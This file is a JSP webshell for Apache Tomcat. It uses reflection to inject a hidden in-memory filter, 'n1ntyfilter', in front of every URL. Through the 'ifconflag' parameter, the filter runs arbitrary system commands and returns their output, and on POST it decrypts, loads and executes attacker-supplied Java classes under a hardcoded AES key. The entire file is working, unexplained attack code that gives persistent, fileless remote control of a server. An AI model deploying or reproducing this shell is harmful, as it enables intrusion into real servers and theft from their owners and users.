<%@ page import="java.lang.reflect.Field" %>
<%@ page import="java.util.Map" %>
<%@ page import="javax.crypto.Cipher" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.lang.reflect.Constructor" %>
<%@ page import="org.apache.catalina.Context" %>
<%@ page import="org.apache.catalina.core.ApplicationFilterConfig" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterDef" %>
<%@ page import="java.lang.reflect.InvocationTargetException" %>
<%@ page import="org.apache.catalina.core.ApplicationContext" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.IOException" %>
<%@ page import="javax.crypto.spec.SecretKeySpec" %>
<%@ page import="java.util.HashMap" %>
<%@ page import="java.lang.reflect.Method" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="org.apache.tomcat.util.descriptor.web.FilterMap" %><%
    final String name = "n1ntyfilter";
    ServletContext ctx = request.getSession().getServletContext();
    Field f = null;
    try {
        f = ctx.getClass().getDeclaredField("context");
    } catch (NoSuchFieldException e) {
        e.printStackTrace();
    }
    f.setAccessible(true);
    ApplicationContext appCtx = null;
    try {
        appCtx = (ApplicationContext)f.get(ctx);
    } catch (IllegalAccessException e) {
        e.printStackTrace();
    }

    try {
        f = appCtx.getClass().getDeclaredField("context");
    } catch (NoSuchFieldException e) {
        e.printStackTrace();
    }
    f.setAccessible(true);
    StandardContext standardCtx = null;
    try {
        standardCtx = (StandardContext)f.get(appCtx);
    } catch (IllegalAccessException e) {
        e.printStackTrace();
    }

    try {
        f = standardCtx.getClass().getDeclaredField("filterConfigs");
    } catch (NoSuchFieldException e) {
        e.printStackTrace();
    }
    f.setAccessible(true);
    Map filterConfigs = null;
    try {
        filterConfigs = (Map)f.get(standardCtx);
    } catch (IllegalAccessException e) {
        e.printStackTrace();
    }

    if (filterConfigs.get(name) == null) {
        System.out.println("inject "+ name);

        Filter filter = new Filter() {
            @Override
            public void init(FilterConfig arg0) throws ServletException {
                // TODO Auto-generated method stub
            }

            @Override
            public void doFilter(ServletRequest arg0, ServletResponse arg1, FilterChain arg2)
                    throws IOException, ServletException {
                System.out.println("11111111111111111111");
                // TODO Auto-generated method stub
                try {
                    javax.servlet.http.HttpServletRequest  request=(javax.servlet.http.HttpServletRequest)arg0;
                    javax.servlet.http.HttpServletResponse  response=(javax.servlet.http.HttpServletResponse)arg1;
                    String cmd = request.getParameter("ifconflag");
                    if (cmd != null && !cmd.equals("")) {
                        if (request.getMethod().equals("POST")) {
                            try {
                                String k = "318c9ede6468af74";
                                HttpSession session = (HttpSession) request.getSession();
                                session.putValue("u", k);
                                Cipher c = Cipher.getInstance("AES");
                                c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                                HashMap hashMap = new HashMap();
                                hashMap.put("request",request);
                                hashMap.put("response",response);
                                hashMap.put("session",session);
                                ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();
                                Class<?> aClass = clzLoader.loadClass("java.lang.ClassLoader");
                                Method defineClass = aClass.getDeclaredMethod("defineClass",  byte[].class, int.class, int.class);
                                defineClass.setAccessible(true);
                                byte[] decode=c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));
                                Class lisi = (Class)defineClass.invoke(clzLoader, decode, 0, decode.length);
                                lisi.newInstance().equals(hashMap);
                            }catch (Exception e){
                                arg2.doFilter(arg0, arg1);
                            }
                        }else {
                            Runtime runtime = Runtime.getRuntime();
                            InputStream inputStream = runtime.exec(cmd).getInputStream();
                            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                            byte[] bytes = new byte[1024];
                            int a = -1;
                            while ((a = inputStream.read(bytes)) != -1) {
                                outputStream.write(bytes, 0, a);
                            }
                            response.getWriter().println(new String(outputStream.toByteArray()));
                        }
                    }else {
                        arg2.doFilter(arg0, arg1);
                    }
                }catch (Exception e){
                    arg2.doFilter(arg0, arg1);
                }
            }

            @Override
            public void destroy() {
                // TODO Auto-generated method stub
            }
        };

        FilterDef filterDef = new FilterDef();
        filterDef.setFilterName(name);
        filterDef.setFilterClass(filter.getClass().getName());
        filterDef.setFilter(filter);

        standardCtx.addFilterDef(filterDef);

        FilterMap m = new FilterMap();
        m.setFilterName(filterDef.getFilterName());
        m.setDispatcher(DispatcherType.REQUEST.name());
        m.addURLPattern("/*");


        standardCtx.addFilterMapBefore(m);


        Constructor constructor = null;
        try {
            constructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);
        } catch (NoSuchMethodException e) {
            e.printStackTrace();
        }
        constructor.setAccessible(true);
        FilterConfig filterConfig = null;
        try {
            filterConfig = (FilterConfig)constructor.newInstance(standardCtx, filterDef);
        } catch (InstantiationException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        }


        filterConfigs.put(name, filterConfig);

        System.out.println("injected");
    }
%>